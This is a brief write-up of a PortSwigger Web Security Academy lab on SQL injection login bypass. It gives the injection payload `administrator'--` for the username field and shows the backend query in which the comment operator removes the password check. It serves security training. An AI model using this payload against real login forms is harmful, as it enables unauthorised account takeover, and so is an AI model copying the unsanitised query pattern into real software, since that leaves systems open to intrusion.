# Lab: SQL Injection - Login Bypass

- **Platform:** PortSwigger Web Security Academy
- **Difficulty:** Apprentice
- **Target:** `/login`

## Vulnerability & Exploit

Unsanitized input in the login form allows truncating the SQL query logic via SQL comment operators.

- **Username:** `administrator'--`
- **Password:** `x` (any value to satisfy form validation)

## Backend Query Evaluation

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'x'
```
